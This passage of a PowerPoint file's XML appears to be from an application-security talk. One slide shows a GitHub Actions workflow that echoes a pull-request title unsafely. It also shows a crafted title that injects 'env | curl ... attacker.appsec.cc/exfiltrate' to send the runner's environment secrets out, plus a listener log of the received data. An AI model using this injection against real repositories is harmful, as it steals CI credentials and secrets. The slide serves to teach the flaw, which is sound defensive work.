        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Group 62 Outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3551253A-18AA-E70E-49E5-9477D1BD16F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4153280" y="1678387"/>
            <a:ext cx="3156295" cy="2093513"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:prstDash val="dash"/>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38" name="ZoneTexte 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BB05535E-D5B2-5BD6-C247-507772104A40}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9183566" y="2528701"/>
            <a:ext cx="2901670" cy="1384995"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>[!] EXFILTRATED DATA RECEIVED</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>  Content-Type : application/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>json</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>  Raw body     :</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>{"hostname":"runnervm3jyl0","username":</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>runner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>","</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>cwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>":"/home/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>runner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>/...</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="39" name="Connecteur droit 38">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF722D22-8951-E314-D442-A11BFE4CF800}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9069468" y="2298701"/>
            <a:ext cx="0" cy="165600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97E226A4-F412-3B6F-D58F-858CA968A70F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7589763" y="3422206"/>
            <a:ext cx="1332000" cy="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1" name="Ellipse 40">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C1D1D63F-750D-E662-F86B-C5395EC2EB1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8093763" y="3470038"/>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3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="ZoneTexte 41">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8399BCEB-BF9B-4542-D4F4-3A6AEEF22150}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7530441" y="3076402"/>
            <a:ext cx="1450645" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>Sends</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> data</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="43" name="Picture 20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3B73A67-BC9E-9CA5-A4DD-4F4772C84D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5312" y="1567519"/>
            <a:ext cx="360000" cy="394521"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="ZoneTexte 43">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0854374F-0D29-4A11-AE27-6DE916B4AFCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9689948" y="1551167"/>
            <a:ext cx="1179792" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>https </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>listener</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="ZoneTexte 47">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{99D4120E-B9B2-B121-C621-262B960AE2CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="285498" y="5751113"/>
            <a:ext cx="11756245" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:defRPr sz="1400"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1800" dirty="0" err="1"/>
              <a:t>echo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1800" dirty="0"/>
              <a:t> "Checking PR: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>fix: update README"; env | curl -s -X POST https://attacker.appsec.cc:9999/exfiltrate --data-binary @- #</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1800" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Ellipse 48">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E05EAC88-E984-0A16-C07B-8A6D428D1FAA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4386344" y="3239513"/>
            <a:ext cx="324000" cy="324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t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="ZoneTexte 49">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3ED698E-F304-BBAD-FE21-BD4D52E1FD92}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4295045" y="2696338"/>
            <a:ext cx="2513824" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t>PR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>title</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>gets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>interpreted</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> in the GitHub </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>acions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1400" dirty="0" err="1"/>
              <a:t>runner</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="51" name="Picture 16" descr="Terminal - Icônes panneaux gratuites">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0B3BA99D-254C-75ED-FCBC-8429CD55EA0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6324" t="14766" r="6324" b="15101"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4751420" y="3256995"/>
            <a:ext cx="360000" cy="289036"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="ZoneTexte 52">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{43E13649-939C-1DBD-8139-349B14691C70}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="285498" y="5271845"/>
            <a:ext cx="5772402" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:defPPr>
              <a:defRPr lang="fr-FR"/>
            </a:defPPr>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>echo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> "Checking PR: ${{ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>github.event.pull_request.title</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> }}"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Organigramme : Carte perforée 53">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D205E23-F406-8977-C951-D755236E3568}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="285498" y="4441909"/>
            <a:ext cx="720000" cy="720000"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartPunchedCar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err="1"/>
              <a:t>ci.yml</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2307400293"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="CatAmania_ppt">
  <a:themeElements>
    <a:clrScheme name="Personnalisé 1">
      <a:dk1>
        <a:srgbClr val="385985"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="385985"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="FFFFFF"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="8D9592"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="C6CBC2"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="31AFDE"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="FBBA00"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="14212C"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="58A333"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="31AFDE"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="385985"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Catamania">
      <a:majorFont>
        <a:latin typeface="Inter"/>
        <a:ea typeface=""/>
        <a:cs typeface=""/>
      </a:majorFont>
      <a:minorFont>
        <a:latin typeface="Inter"/>
        <a:ea typeface=""/>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0" marR="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
          <a:lnSpc>
            <a:spcPct val="100000"/>
          </a:lnSpc>
          <a:spcBef>
            <a:spcPts val="0"/>
          </a:spcBef>
          <a:spcAft>
            <a:spcPts val="0"/>
          </a:spcAft>
          <a:buClrTx/>
          <a:buSzTx/>
          <a:buFontTx/>
          <a:buNone/>
          <a:tabLst/>
          <a:defRPr sz="1800" b="0" i="0" u="none" strike="noStrike" kern="1200" baseline="30000" dirty="0" smtClean="0">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:latin typeface="Roboto Light"/>
            <a:ea typeface="+mn-ea"/>
            <a:cs typeface="+mn-cs"/>
          </a:defRPr>
        </a:defPPr>
      </a:lstStyle>
    </a:txDef>
  </a:objectDefaults>
  <a:extraClrSchemeLst/>
  <a:extLst>
    <a:ext uri="{05A4C25C-085E-4340-85A3-A5531E510DB2}">
      <thm15:themeFamily xmlns:thm15="http://schemas.microsoft.com/office/thememl/2012/main" name="Présentation1" id="{FEE37E07-0486-4A72-8179-2B7212F30405}" vid="{BAB14457-2C4B-4136-9AF7-230642259A9A}"/>
    </a:ext>
  </a:extLst>
</a:theme>
</file>

<file path=ppt/theme/theme2.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Conception personnalisée">
  <a:themeElements>
    <a:clrScheme name="Personnalisé 1">
      <a:dk1>
        <a:srgbClr val="385985"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="385985"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="FFFFFF"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="8D9592"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="C6CBC2"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="31AFDE"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="FBBA00"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="14212C"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="58A333"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="31AFDE"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="385985"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Catamani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FEE37E07-0486-4A72-8179-2B7212F30405}" vid="{CEE61C44-EE26-47C9-8892-C4A9A5F0E62D}"/>
    </a:ext>
  </a:extLst>
</a:theme>
</file>

<file path=ppt/theme/theme3.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="1_Conception personnalisée">
  <a:themeElements>
    <a:clrScheme name="Catamania">
      <a:dk1>
        <a:srgbClr val="385985"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="385985"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="FFFFFF"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="8D9592"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="C6CBC2"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="31AFDE"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="FBBA00"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="385985"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="FFFFFF"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="31AFDE"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="38598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60045B-3F82-46B1-8548-6027B18EC32C}">
  <we:reference id="wa200010725" version="1.0.0.1" store="en-US" storeType="OMEX"/>
  <we:alternateReferences>
    <we:reference id="wa200010725" version="1.0.0.1" store="" storeType="OMEX"/>
  </we:alternateReferences>
  <we:properties>
    <we:property name="claude.fileId" value="&quot;f88dfcbf-5960-4e74-a183-e90936f31ed5&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0AEC8C8740A2448F10F9F8A277FB7C" ma:contentTypeVersion="14" ma:contentTypeDescription="Crée un document." ma:contentTypeScope="" ma:versionID="a643091ed7ba36f11bbe1cd0d321d5d6">
  <xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:p="http://schemas.microsoft.com/office/2006/metadata/properties" xmlns:ns2="fc0ca498-bcc3-495a-b6ec-779e1e0396a9" xmlns:ns3="027d3d22-9dd5-49e8-89cc-3c45ce21028f" targetNamespace="http://schemas.microsoft.com/office/2006/metadata/properties" ma:root="true" ma:fieldsID="628048dc61ef40a463dba7f6d4d3ab49" ns2:_="" ns3:_="">
    <xsd:import namespace="fc0ca498-bcc3-495a-b6ec-779e1e0396a9"/>
    <xsd:import namespace="027d3d22-9dd5-49e8-89cc-3c45ce21028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0ca498-bcc3-495a-b6ec-779e1e0396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8e6864c8-011f-4f44-84be-8e9f5080e26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7d3d22-9dd5-49e8-89cc-3c45ce21028f" elementFormDefault="qualified">
    <xsd:import namespace="http://schemas.microsoft.com/office/2006/documentManagement/types"/>
    <xsd:import namespace="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    <xsd:element name="SharedWithUsers" ma:index="14"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Partagé avec détails" ma:internalName="SharedWithDetails" ma:readOnly="true">
      <xsd:simpleType>
        <xsd:restriction base="dms:Note">
          <xsd:maxLength value="255"/>
        </xsd:restriction>
      </xsd:simpleType>
    </xsd:element>
    <xsd:element name="TaxCatchAll" ma:index="18" nillable="true" ma:displayName="Taxonomy Catch All Column" ma:hidden="true" ma:list="{30b0cd19-221c-4c0c-bc42-c3fecad18960}" ma:internalName="TaxCatchAll" ma:showField="CatchAllData" ma:web="027d3d22-9dd5-49e8-89cc-3c45ce2102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027d3d22-9dd5-49e8-89cc-3c45ce21028f">
      <UserInfo>
        <DisplayName>Donovan GUILLOT</DisplayName>
        <AccountId>878</AccountId>
        <AccountType/>
      </UserInfo>
      <UserInfo>
        <DisplayName>Mailys CHATELET</DisplayName>
        <AccountId>721</AccountId>
        <AccountType/>
      </UserInfo>
    </SharedWithUsers>
    <lcf76f155ced4ddcb4097134ff3c332f xmlns="fc0ca498-bcc3-495a-b6ec-779e1e0396a9">
      <Terms xmlns="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    </lcf76f155ced4ddcb4097134ff3c332f>
    <TaxCatchAll xmlns="027d3d22-9dd5-49e8-89cc-3c45ce21028f" xsi:nil="true"/>
  </documentManagement>
</p:properties>
</file>

<file path=customXml/itemProps1.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{F964DB76-80E2-4911-BB79-8FAB7E102B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0ca498-bcc3-495a-b6ec-779e1e0396a9"/>
    <ds:schemaRef ds:uri="027d3d22-9dd5-49e8-89cc-3c45ce210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246DD5-6D67-4329-A9DE-83742B7E7D7E}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/sharepoint/v3/contenttype/forms"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=customXml/itemProps3.xml><?xml version="1.0" encoding="utf-8"?>
<ds:datastoreItem xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml" ds:itemID="{0173FAF3-F820-4EB1-B971-ED548FA212F7}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://purl.org/dc/terms/"/>
    <ds:schemaRef ds:uri="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"/>
    <ds:schemaRef ds:uri="http://www.w3.org/XML/1998/namespace"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/documentManagement/types"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/infopath/2007/PartnerControls"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/elements/1.1/"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/dcmitype/"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/metadata/properties"/>
    <ds:schemaRef ds:uri="fc0ca498-bcc3-495a-b6ec-779e1e0396a9"/>
    <ds:schemaRef ds:uri="027d3d22-9dd5-49e8-89cc-3c45ce21028f"/>
  </ds:schemaRefs>
</ds:datastoreItem>
</file>

<file path=docProps/app.xml><?xml version="1.0" encoding="utf-8"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
  <Template>DQ_S1_20_Modèle de présentation PWP 2023</Template>
  <TotalTime>3812</TotalTime>
  <Words>4126</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Grand écran</PresentationFormat>
  <Paragraphs>246</Paragraphs>
  <Slides>10</Slides>
  <Notes>5</Notes>
  <HiddenSlides>0</HiddenSlides>
  <MMClips>0</MMClips>
  <ScaleCrop>false</ScaleCrop>
  <HeadingPairs>
    <vt:vector size="6" baseType="variant">
      <vt:variant>
        <vt:lpstr>Polices utilisées</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>8</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>Thème</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>3</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>Titres des diapositives</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>10</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="21" baseType="lpstr">
      <vt:lpstr>Lucida Grande</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Inter</vt:lpstr>
      <vt:lpstr>Inter Light</vt:lpstr>
      <vt:lpstr>Inter Medium</vt:lpstr>
      <vt:lpstr>Nunito ExtraLight</vt:lpstr>
      <vt:lpstr>Roboto</vt:lpstr>
      <vt:lpstr>CatAmania_ppt</vt:lpstr>
      <vt:lpstr>Conception personnalisée</vt:lpstr>
      <vt:lpstr>1_Conception personnalisée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Olivier PC</dc:creator>
  <cp:lastModifiedBy>Adrien VERGNAUD</cp:lastModifiedBy>
  <cp:revision>48</cp:revision>
  <cp:lastPrinted>2025-03-05T09:38:39Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-11-25T13:07:07Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-02T10:03:14Z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0x0101006E0AEC8C8740A2448F10F9F8A277FB7C</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="Order">
    <vt:r8>1322900</vt:r8>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="xd_Signature">
    <vt:bool>false</vt:bool>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="5" name="SharedWithUsers">
    <vt:lpwstr>878;#Donovan GUILLOT;#721;#Mailys CHATELET</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="6" name="xd_ProgID">
    <vt:lpwstr/>
